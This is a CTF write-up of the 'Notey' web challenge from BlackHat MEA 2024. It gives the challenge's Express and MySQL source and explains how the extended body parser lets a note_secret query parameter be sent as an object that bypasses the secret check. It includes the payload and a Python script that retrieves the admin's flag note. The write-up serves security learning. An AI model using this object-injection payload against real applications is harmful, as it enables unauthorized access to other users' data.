---
title: "Notey - BlackHat MEA CTF Qualification 2024"
category: "web"
type: "writeup"
tags: ["web", "mysql", "notey", "blackhat-mea-ctf-qualification", "blackhat-mea-ctf-qualification-202", "2024", "ctf-writeup"]
summary: "In this Challenge we were provided with 3 code files (database.js, index.js, middleware.js)"
source:
  name: "CTFtime writeup #39414"
  url: "https://ctftime.org/writeup/39414"
ctf:
  name: "BlackHat MEA CTF Qualification 2024"
  year: 2024
  challenge: "Notey"
---

## Metadata

- **CTF:** BlackHat MEA CTF Qualification 2024
- **Task:** Notey
- **Author team:** V3n0m.py
- **CTFtime:** <https://ctftime.org/writeup/39414>

---
In this Challenge we were provided with 3 code files (*database.js, index.js, middleware.js*)

\- `database.js`  
  
```jsx  
const mysql = require('mysql');  
const crypto=require('crypto');  
  
const pool = mysql.createPool({  
host: '127.0.0.1',  
user: 'ctf',  
password: 'ctf123',  
database: 'CTF',  
waitForConnections: true,  
connectionLimit: 10,  
queueLimit: 0  
});  
  
// One liner to wait a second  
async function wait() {  
await new Promise(r => setTimeout(r, 1000));  
}  
  
function insertAdminUserOnce(callback) {  
const checkUserQuery = 'SELECT COUNT(*) AS count FROM users WHERE username = ?';  
const insertUserQuery = 'INSERT INTO users (username, password) VALUES (?, ?)';  
const username = 'admin';  
const password = crypto.randomBytes(32).toString("hex");  
  
pool.query(checkUserQuery, [username], (err, results) => {  
if (err) {  
console.error('Error executing query:', err);  
callback(err, null);  
return;  
}  
  
const userCount = results[0].count;  
  
if (userCount === 0) {  
pool.query(insertUserQuery, [username, password], (err, results) => {  
if (err) {  
console.error('Error executing query:', err);  
callback(err, null);  
return;  
}  
console.log(`Admin user inserted successfully with this passwored ${password}.`);  
callback(null, results);  
});  
} else {  
console.log('Admin user already exists. No insertion needed.');  
callback(null, null);  
}  
});  
}  
  
function insertAdminNoteOnce(callback) {  
const checkNoteQuery = 'SELECT COUNT(*) AS count FROM notes WHERE username = "admin"';  
const insertNoteQuery = 'INSERT INTO notes(username,note,secret)values(?,?,?)';  
const flag = process.env.DYN_FLAG || "placeholder";  
const secret = crypto.randomBytes(32).toString("hex");  
  
pool.query(checkNoteQuery, [], (err, results) => {  
if (err) {  
console.error('Error executing query:', err);  
callback(err, null);  
return;  
}  
  
const NoteCount = results[0].count;  
  
if (NoteCount === 0) {  
pool.query(insertNoteQuery, ["admin", flag, secret], (err, results) => {  
if (err) {  
console.error('Error executing query:', err);  
callback(err, null);  
return;  
}  
console.log(`Admin Note inserted successfully with this secret ${secret}`);  
callback(null, results);  
});  
} else {  
console.log('Admin Note already exists. No insertion needed.');  
callback(null, null);  
}  
});  
}  
  
function login_user(username,password,callback){  
  
const query = 'Select * from users where username = ? and password = ?';  
  
pool.query(query, [username,password], (err, results) => {  
if (err) {  
console.error('Error executing query:', err);  
callback(err, null);  
return;  
}  
callback(null, results);  
});  
}  
  
function register_user(username, password, callback) {  
const checkUserQuery = 'SELECT COUNT(*) AS count FROM users WHERE username = ?';  
const insertUserQuery = 'INSERT INTO users (username, password) VALUES (?, ?)';  
  
pool.query(checkUserQuery, [username], (err, results) => {  
if (err) {  
console.error('Error executing query:', err);  
callback(err, null);  
return;  
}  
  
const userCount = results[0].count;  
  
if (userCount === 0) {  
pool.query(insertUserQuery, [username, password], (err, results) => {  
if (err) {  
console.error('Error executing query:', err);  
callback(err, null);  
return;  
}  
console.log('User registered successfully.');  
callback(null, results);  
});  
} else {  
console.log('Username already exists.');  
callback(null, null);  
}  
});  
}  
  
function getNotesByUsername(username, callback) {  
const query = 'SELECT note_id,username,note FROM notes WHERE username = ?';  
pool.query(query, [username], (err, results) => {  
if (err) {  
console.error('Error executing query:', err);  
callback(err, null);  
return;  
}  
callback(null, results);  
});  
}  
  
function getNoteById(noteId, secret, callback) {  
const query = 'SELECT note_id,username,note FROM notes WHERE note_id = ? and secret = ?';  
console.log(noteId,secret);  
pool.query(query, [noteId,secret], (err, results) => {  
if (err) {  
console.error('Error executing query:', err);  
callback(err, null);  
return;  
}  
callback(null, results);  
});  
}  
  
function addNote(username, content, secret, callback) {  
const query = 'Insert into notes(username,secret,note)values(?,?,?)';  
pool.query(query, [username, secret, content], (err, results) => {  
if (err) {  
console.error('Error executing query:', err);  
callback(err, null);  
return;  
}  
callback(null, results);  
});  
}  
  
module.exports = {  
getNotesByUsername, login_user, register_user, getNoteById, addNote, wait, insertAdminNoteOnce, insertAdminUserOnce  
};  
```  
  
\- `index.js`  
  
```jsx  
const express = require('express');  
const bodyParser = require('body-parser');  
const crypto=require('crypto');  
var session = require('express-session');  
const db = require('./database');  
const middleware = require('./middlewares');  
  
const app = express();  
  
app.use(bodyParser.urlencoded({  
extended: true  
}))  
  
app.use(session({  
secret: crypto.randomBytes(32).toString("hex"),  
resave: true,  
saveUninitialized: true  
}));  
  
app.get('/',(req,res)=>{  
res.send("Welcome")  
})  
  
app.get('/profile', middleware.auth, (req, res) => {  
const username = req.session.username;  
  
db.getNotesByUsername(username, (err, notes) => {  
if (err) {  
return res.status(500).json({ error: 'Internal Server Error' });  
}  
res.json(notes);  
});  
});  
  
app.get('/viewNote', middleware.auth, (req, res) => {  
const { note_id,note_secret } = req.query;  
  
if (note_id && note_secret){  
db.getNoteById(note_id, note_secret, (err, notes) => {  
if (err) {  
return res.status(500).json({ error: 'Internal Server Error' });  
}  
return res.json(notes);  
});  
}  
else  
{  
return res.status(400).json({"Error":"Missing required data"});  
}  
});  
  
[app.post](http://app.post)('/addNote', middleware.auth, middleware.addNote, (req, res) => {  
const { content, note_secret } = req.body;  
db.addNote(req.session.username, content, note_secret, (err, results) => {  
if (err) {  
return res.status(500).json({ error: 'Internal Server Error' });  
}  
  
if (results) {  
return res.json({ message: 'Note added successful' });  
} else {  
return res.status(409).json({ error: 'Something went wrong' });  
}  
});  
});  
  
[app.post](http://app.post)('/login', middleware.login, (req, res) => {  
const { username, password } = req.body;  
  
db.login_user(username, password, (err, results) => {  
if (err) {  
console.log(err);  
return res.status(500).json({ error: 'Internal Server Error' });  
}  
  
if (results.length > 0) {  
req.session.username = username;  
return res.json({ message: 'Login successful' });  
} else {  
return res.status(401).json({ error: 'Invalid username or password' });  
}  
});  
});  
  
[app.post](http://app.post)('/register', middleware.login, (req, res) => {  
const { username, password } = req.body;  
  
db.register_user(username, password, (err, results) => {  
if (err) {  
return res.status(500).json({ error: 'Internal Server Error' });  
}  
  
if (results) {  
return res.json({ message: 'Registration successful' });  
} else {  
return res.status(409).json({ error: 'Username already exists' });  
}  
});  
});  
  
db.wait().then(() => {  
db.insertAdminUserOnce((err, results) => {  
if (err) {  
console.error('Error:', err);  
} else {  
db.insertAdminNoteOnce((err, results) => {  
if (err) {  
console.error('Error:', err);  
} else {  
app.listen(3000, () => {  
console.log('Server started on http://localhost:3000');  
});  
}  
});  
}  
});  
});  
  
```  
  
\- `middleware.js`  
  
```jsx  
const auth = (req, res, next) => {  
ssn = req.session  
if (ssn.username) {  
return next();  
} else {  
return res.status(401).send('Authentication required.');  
}  
};  
  
const login = (req,res,next) =>{  
const {username,password} = req.body;  
if ( !username || ! password )  
{  
return res.status(400).send("Please fill all fields");  
}  
else if(typeof username !== "string" || typeof password !== "string")  
{  
return res.status(400).send("Wrong data format");  
}  
next();  
}  
  
const addNote = (req,res,next) =>{  
const { content, note_secret } = req.body;  
if ( !content || ! note_secret )  
{  
return res.status(400).send("Please fill all fields");  
}  
else if(typeof content !== "string" || typeof note_secret !== "string")  
{  
return res.status(400).send("Wrong data format");  
}  
else if( !(content.length > 0 && content.length < 255) || !( note_secret.length >=8 && note_secret.length < 255) )  
{  
return res.status(400).send("Wrong data length");  
}  
next();  
}  
  
module.exports ={  
auth, login, addNote  
};  
```  


After reading `database.js`, we understand that an admin user is created and a note is added in that user, which contains the flag.

**Therefore, the goal of the challenge is to be able to read the note in the admin user.**

Looking at the viewNote function in `index.js`, we understand that we need to be authenticated and have both (the `note_id` & the `secret_id`).

The auth middleware function in viewNote can be found in the `middle.js` code where its sole purpose is to verify that the session cookie contains a username property, without considering what the actual username is.

In order to investigate and test the code further, I wrote a python script that registers, logins, and adds a note.

![](<https://i.imgur.com/8L8Kgvv.png>)

notice that the `note_id`starts from `67`.

Looking again at the source code in index.js, you'll notice it starts with the following snippet:

```jsx  
app.use(bodyParser.urlencoded({  
extended: true  
}))   
```

A quick google search reveals that this vulnerability was abused in <https://ctftime.org/writeup/23047>

This setting instructs the body parser to accept arrays and objects in the request body, 

For data formatted like this:

```css  
user[name]=John&user[age]=30  
```

The body parser interprets it as an object:

```css  
user = { name: 'John', age: 30 }  
```

Since we know that the `note_id` might be `66`, but we do not know the `note_secret`, we can try to pass an object in the place of `note_secret`, with a known attribute. Here's the payload I tried:

```css  
note_id=66&note_secret[note_id]=""  
```

The body parser should interpret it as an object:

```css  
note_secret = { note_id: 66 }  
```

This should evaluate to:

```sql  
"Select note_id,username,note FROM notes WHERE note_id = 66 and secret= `note_id` = 66;"  
```

\- Solution  
  
```python  
import requests  
import threading  
  
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)  
  
url = "<http://ab11412c8b75502acc276.playat.flagyard.com/>"  
  
SESSION = requests.Session()  
SESSION.verify = False   
  
def register(username, password):  
data = {"username": username, "password": password}  
response = [SESSION.post](http://SESSION.post)(url + "register", data=data)  
return response  
  
def login(username, password):  
data = {"username": username, "password": password}  
response = [SESSION.post](http://SESSION.post)(url + "login", data=data)  
return response  
  
def addNote(content, note_secret):  
data = {"content": content, "note_secret": note_secret}  
response = [SESSION.post](http://SESSION.post)(url + "addNote", data=data)  
return response  
  
def viewNote(note_id, note_secret):  
params = {"note_id": note_id, "note_secret[note_id]": note_secret}  
response = SESSION.get(url + "viewNote", params=params)  
return response  
  
def getProfile(username):  
params = {"username": username}  
response = SESSION.get(url + "viewNote", params=params)  
response = SESSION.get(url + "profile")  
return response  
  
def main():  
user = "test1"  
passwd = "test1"  
note = "test1"  
note_secret = "Test@123"  
  
# register_response = register(user, passwd)  
# print("Register Response:", register_response.status_code, register_response.text)  
  
login_response = login(user, passwd)  
print("Login Response:", login_response.status_code, login_response.text)  
  
profile_response = getProfile(user)  
print("Profile Response:", profile_response.status_code, profile_response.text)  
  
view_note_response = viewNote(66, note_secret)  
print("View Note Response:", view_note_response.status_code, view_note_response.text)  
  
# add_note = addNote(note, note_secret)  
# print("Note Added:", add_note.status_code, add_note.text)  
  
if __name__ == "__main__":  
main()  
```  


![image.png](<https://i.imgur.com/PzD88Fu.png>)

The flag is: BHFlagY{df7d590455383a7f298ecf861d136f00}

![image.png](<https://i.imgur.com/OJ1BnCv.png>)
